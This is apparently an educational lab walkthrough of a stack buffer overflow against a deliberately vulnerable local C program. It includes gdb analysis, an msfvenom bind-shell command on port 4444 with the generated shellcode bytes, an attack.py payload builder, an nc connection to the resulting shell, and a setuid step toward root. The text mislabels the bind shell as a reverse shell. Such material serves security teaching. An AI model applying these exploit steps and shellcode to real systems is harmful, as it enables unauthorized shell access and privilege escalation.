# Linux Buffer Overflow with Listening Shell

```c title="copier.c"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

int copier(char *str);

// compile with gcc -g -z execstack -no-pie -o copier copier.c
void main(int argc, char *argv[]) {
	if( argc != 2 ) {
	 		printf("Usage: %s string\n", argv[0]);
   		exit(0);
	}
	printf("esp: %#010x\n", copier(argv[1]));
	printf("Done!\n");
}

int copier(char *str) {
	char buffer[1000];
	register int i asm("esp");
	strcpy(buffer, str);
	return i;
}
```


After compiling [copier.c] using `gcc`:

```bash
#!/bin/bash

die () {
 echo >&2 "$@"
 exit 1
 }

[ "$#" -eq 2 ] || die "usage: compile_c.sh /path/to/src.c arch (32|64)"

src=$1
arch=$2

filename="$(basename -s .c $src)"
tmp_dir=$(mktemp -d --suffix=-$filename /tmp/XXXX)
output="$tmp_dir/$filename-$arch"

echo "compiling $src..."

if [[ $arch -eq "64" ]]
then
 boundary=3
else
 boundary=2
fi

cc \
 -mpreferred-stack-boundary=$boundary \
 -ggdb \
 -static \
 -"m$arch" \
 -no-pie \
 -fno-stack-protector \
 -z execstack \
 -o $output $src


echo "Compilation complete, see file $output"
```

We send 1004 Us to the program to make it crash. 
We use the helper fuzzer script:

```python
#!/usr/bin/python3

import sys
import argparse
import re


def address_regex_type(arg_value, pat=re.compile(r"0x[a-f0-9A-F]{8}")):
    if not pat.match(arg_value):
        raise argparse.ArgumentTypeError("Invalid memory address supplied. Example value: 0x565556dc")
    return arg_value


def main():

    m_parser = argparse.ArgumentParser(
        description="Fuzzer and shellcode creator",
        prog="fuzzshell"
    )
    m_parser.version = '1.0.0'

    m_parser.add_argument(
        '-mem_add',
        '--a',
        type=address_regex_type,
        help='The memory address to append to payload'
    )

    m_parser.add_argument(
        'prefix',
        type=int,
        nargs='?',
        const=0,
        default=0,
        help='Number of characters to append to beginning of payload'
    )

    m_parser.add_argument(
        '-version',
        action='version'
    )

    m_parser.add_argument(
        '-suffix',
        '--s',
        type=int,
        nargs='?',
        const=0,
        default=0,
        help='Number of characters to append to end of payload',
    )

    m_parser.add_argument(
        '-suffix-fuzz-char',
        '--sf',
        type=str,
        help="Character to use as fuzzer for the suffix",
        nargs='?',
        const="U", # Converts to 55 in bytes, easy to see
        default="U"
    )

    m_parser.add_argument(
        '-prefix-fuzz-char',
        '--pf',
        type=str,
        help="Character to use as fuzzer for the prefix",
        nargs='?',
        const="U", # Converts to 55 in bytes, easy to see
        default="U"
    )

    args = m_parser.parse_args()
    
    memory_address=args.a
    number_of_chars_prefix=args.prefix
    number_of_chars_postfix=args.s

    prefix = number_of_chars_prefix * args.pf
    suffix = number_of_chars_postfix * args.sf

    if memory_address:
        hex_mem_address = memory_address.split("0x")[1]

        reversed_hex_mem_bytes = [hex_mem_address[i:i+2] for i in range(0, len(hex_mem_address), 2)]

        reversed_hex_mem_bytes.reverse()

        hex_str = ""
        for byte in reversed_hex_mem_bytes:
            hex_str += chr(int(byte, 16))
        
        eip = hex_str

        print(prefix + eip + suffix)
    else:
        print(prefix + suffix)

if __name__ == "__main__":
    main()
```

to generate 1008 `U`s and cause the crash:

```bash
./copier-32 $(create_shellcode_input.py 1000)
esp: 0xffffc5fc
Done!



./copier-32 $(create_shellcode_input.py 1008)
[1]    420177 segmentation fault (core dumped)  ./copier-32 $(create_shellcode_input.py 1008)
```


## Analyzing Crash with `gdb`

`gdb` allows us to check out the memory contents when the crash occurs. 

The first thing we need to do is analyze the source code to see what Assembly instruction causes the buffer overflow. Reviewing the source code [copier.c], we can see that it occurs in line 20 where we use the `strcpy` method to copy the value of the `str` argument into the `buffer` character array:

```c
(gdb) l 17,
17      int copier(char *str) {
18              char buffer[1000];
19              register int i asm("esp");
20              strcpy(buffer, str);           <====
21              return i;
22      }
```

Let's look at the Assembly instructions behind the `copier` method and find the byte offset from the beginning of the method memory address:

```
(gdb) disas copier
Dump of assembler code for function copier:
   0x08049dc0 <+0>:     endbr32 
   0x08049dc4 <+4>:     push   %ebp
   0x08049dc5 <+5>:     mov    %esp,%ebp
   0x08049dc7 <+7>:     push   %ebx
   0x08049dc8 <+8>:     sub    $0x3e8,%esp
   0x08049dce <+14>:    call   0x8049df3 <__x86.get_pc_thunk.ax>
   0x08049dd3 <+19>:    add    $0x9b22d,%eax
   0x08049dd8 <+24>:    pushl  0x8(%ebp)
   0x08049ddb <+27>:    lea    -0x3ec(%ebp),%edx
   0x08049de1 <+33>:    push   %edx
   0x08049de2 <+34>:    mov    %eax,%ebx
   0x08049de4 <+36>:    call   0x8049030
=> 0x08049de9 <+41>:    add    $0x8,%esp
   0x08049dec <+44>:    mov    %esp,%eax
   0x08049dee <+46>:    mov    -0x4(%ebp),%ebx
   0x08049df1 <+49>:    leave  
   0x08049df2 <+50>:    ret    
End of assembler dump.
```

We can see that there's a system call in byte +36 which is the execution `strcpy`. We put the breakpoint in the instruction right below it (see arrow in output above, byte +41) so we can examine the memory contents and see where the `RET` address lies for the subroutine.

```
(gdb) b * copier +41
```

Now let's run the program again with the payload that caused the crash:

```
(gdb) run $(create_shellcode_input.py 1008 -suffix 1 --sf 1234)
Starting program: /tmp/U2Cs-copier/copier-32 $(create_shellcode_input.py 1008 -suffix 1 --sf 1234)

Breakpoint 1, 0x08049de9 in copier (str=0xffffcb00 "\377\373\353\277\006") at copier.c:20
20              strcpy(buffer, str);
```

We've froze the execution. We can now examine the memory to see the stack start (`esp`) and end (`ebp`) addresses.

```
(gdb) i r esp
esp            0xffffc4e4          0xffffc4e4
(gdb) i r ebp
ebp            0xffffc8d8          0xffffc8d8
```

The stack is `0x3F4` in size (`1012` in decimal) which identical to the number of characters we're sending in the payload (`1008*'U' + '1234'`). 
This means that we've likely overwritten the whole stack and set the `RET` address to whatever ASCII `1234` equals in hexadecimal (which is `0x34333231`).

Since we know that the `RET` is 4 bytes higher in memory than the `EBP`, we can see what instruction we have there:

```
(gdb) x/x $ebp+4
0xffffc8dc:     0x34333231
```

We can now confirm the `RET` address contains our suffix `1234` in it. So we're in full control of the `EIP`. Knowing how to control the `EIP` means we can now move the instruction pointer to an arbitrary memory address within the stack where we'll set up a `NOP` sled. The `EIP` will proceed to execute the `NOP`s until it hits an address where we will inplant our reverse shellcode.

This is how the payload should look like:

```bash
./copier-32 "<$NOP_SLED><$SHELLCODE><$FUZZING$><$RETURN_LOCATION_IN_NOPSLED>"
```

At this point, all we know is `FUZZING='U'*1008`. Let's take a look how to create the shellcode and how the `NOP` is defined.

## Generating Shellcode using `msfvenom`

We will use Metasploit to generate the shellcode for us.

We want to create a reverse shell payload for the `x86` architecture on Linux. The purpose of the shellcode is to open a port on the machine (hackers like to use port `4444`). Then we can open a connection using a client such as `netcat` or `telnet` from another terminal and get access. 

We want to ensure that the shellcode will not contain anything that can terminate the `stdin` (such as a `null` byte `0x00`) so we specify the encoder to contain only alphanumeric characters. To do this, we run the following command:

```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 AppendExit=true --encoder x86/alpha_mixed -f python -o ./reverse_shellcode.py 

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 231 (iteration=0)
x86/alpha_mixed chosen with final size 231
Payload size: 231 bytes
Final size of python file: 1133 bytes
Saved as: ./reverse_shellcode.py
```

Take a look at the generated shellcode:

```python title="reverse_shellcode.py"
buf =  b""
buf += b"\x89\xe0\xd9\xe9\xd9\x70\xf4\x58\x50\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x36\x51\x69\x4b\x68"
buf += b"\x77\x69\x73\x72\x73\x33\x73\x42\x73\x70\x6a\x57\x72"
buf += b"\x6f\x79\x79\x71\x6e\x50\x61\x76\x6a\x6d\x4f\x70\x63"
buf += b"\x6b\x31\x4e\x31\x42\x35\x38\x56\x62\x75\x50\x34\x51"
buf += b"\x53\x6c\x63\x5a\x76\x70\x70\x51\x32\x70\x6c\x49\x4b"
buf += b"\x51\x32\x4a\x35\x36\x70\x58\x58\x4d\x6d\x50\x6b\x39"
buf += b"\x62\x61\x74\x44\x6e\x53\x53\x34\x68\x30\x45\x36\x6a"
buf += b"\x6d\x6f\x70\x30\x43\x48\x30\x71\x76\x48\x4d\x6d\x50"
buf += b"\x5a\x33\x43\x69\x71\x7a\x65\x6f\x63\x68\x38\x4d\x6d"
buf += b"\x50\x52\x69\x33\x49\x6c\x38\x42\x48\x46\x4f\x46\x4f"
buf += b"\x52\x53\x63\x58\x72\x48\x34\x6f\x53\x52\x31\x79\x52"
buf += b"\x4e\x4d\x59\x4a\x43\x70\x50\x33\x63\x6e\x69\x78\x61"
buf += b"\x4c\x70\x64\x4b\x58\x4d\x6d\x50\x76\x51\x6b\x6b\x43"
buf += b"\x5a\x53\x31\x66\x38\x6a\x6d\x6f\x70\x41\x41"
```


Now that we have the shellcode, we can define a `NOP` sled of a certain size. Since we know the size of the entire stack is `1012`, we can set the `NOP` sled to `500` characters long:

```python
NOP_SLED = '\x90' * 500
```

`NOP_SLED` - check. `SHELLCODE` - check. The last part of the payload is the `RETURN_LOCATION_IN_NOPSLED`. Let's find it.

## Return Address in `NOP` Sled

The reason behind appending a memory address to the end of the payload is because this will be the next instruction executed once the `copier` function completes execution (the `RET` address in Assembly). This is where we bind the execution reverse shellcode with the program that is vulnerable to buffer overflow.

Choosing the address is arbitrary because it will be sufficient to choose one that is anywhere within the designated memory address range where the `NOP` instructions lie.

Using `gdb`, it's quite easy to find an address:

```
gdb copier-32

Reading symbols from copier-32...
Breakpoint 1 at 0x8049de9: file copier.c, line 20.

Breakpoint 1, 0x08049de9 in copier (str=0xffffcc00 "") at copier.c:20

(gdb) x/64x $esp
20              strcpy(buffer, str);
0xffffc554:     0xffffc55c      0xffffcc46      0x90909090      0x90909090
0xffffc564:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffc574:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffc584:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffc594:     0x90909090      0x90909090      0x90909090      0x90909090
...
0xffffc6e4:     0x90909090      0x90909090      0x90909090      0x90909090
...
0xffffc834:     0x4141706f      0x55555555      0x55555555      0x55555555
0xffffc844:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffc854:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffc864:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffc874:     0x55555555      0x55555555      0x55555555      0x55555555
....
0xffffc904:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffc914:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffc924:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffc934:     0x55555555      0x55555555      0x55555555      0x55555555
0xffffc944:     0x55555555      0x55555555      0xffffc6e4      0xffffcc00
...
```

We can choose any memory address within the range of `x90` words. Let's select `0xffffc6e4`.

Since the memory words are filled out in little Endian form, in order for us to add the memory address to the shellcode, we will need to transform it and feed it into the payload in the opposite direction:

```python
#0xffffc6e4 => \xe4\xc6\xff\xff
RETURN_LOCATION_IN_NOPSLED = '\xe4\xc6\xff\xff'
```

Avoid addresses containing `00`, `10`, or `20` bytes, which will be be treated as delimiters and terminate the string prematurely.

We now have all the necessary pieces of the payload in order to exploit the buffer overflow and have user access. Let's put it all together.

## Building the Exploit

Remember the file `./reverse_shellcode.py` includes our shellcode. Let's copy it and use it as the basis for our attack script.

```bash
cp ./revese_shellcode.py attack.py
```

Next, let's add the following lines to `attack.py`:

```python title="attack.py"
#!/usr/bin/python

buf =  b""
buf += b"\x89\xe0\xd9\xe9\xd9\x70\xf4\x58\x50\x59\x49\x49\x49"
# ...
buf += b"\x5a\x53\x31\x66\x38\x6a\x6d\x6f\x70\x41\x41"

# Add from here down
NOP_SLED = '\x90' * 500
EIP = '\xe4\xc6\xff\xff'
FUZZING = 'U' * (1008 - len(NOP_SLED) - len(buf))

NOP_SLED = '\x90' * 500
FUZZING   = 'U' * (1008 - len(NOP_SLED) - len(buf))

# 0xffffc6e4
RETURN_LOCATION_IN_NOPSLED = '\xe4\xc6\xff\xff'

attack = NOP_SLED + buf + FUZZING + RETURN_LOCATION_IN_NOPSLED

print(attack)
```

Let's see what it prints out:

```bash
chmod +x ./attack.py
pXPYIIIIIIIIIICCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI6QiKhwisrs3sBspjWroyyqnPavjmOpck1N1B58VbuP4QSlcZvppQ2plIKQ2J56pXXMmPk9batDnSS4h0E6jmop0CH0qvHMmPZ3Ciqzeoch8MmPRi3Il8BHFOFORScXrH4oSR1yRNMYJCpP3cnixaLpdKXMmPvQkkCZS1f8jmopAAUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
```

## Getting a Shell

We have completed all the necessary steps to create the payload, let's actually run the exploit and see if we can get access from another terminal.

To run the exploit:

```bash
./copier-32 $(./attack.py)
```

We can see that nothing happens, the `copier-32` is executed but it's not immediately terminated.

From another terminal (or using another `tmux` window/pane), let's check whether there's anything listening on port `4444`:

```bash
ss -pant | grep 4444

LISTEN      0        0      0.0.0.0:4444  0.0.0.0:*       users:(("copier-32",pid=136386,fd=3))
```

From the output, we can see that the binary `copier-32` (Process ID `136386`) is listening on `4444`. Let's try to connect to it:

```
nc localhost 4444
whoami
my_linux_user
```

As we can see above, we got a shell, but that it's not `root`. The reason is that the binary `copier-32` was run with user `my_linux_user` and not with `root`. To be able to get `root` access, the binary `copier-32` would need to be owned by `root` also:

```bash
sudo chown root copier-32
sudo chmod +s copier-32
```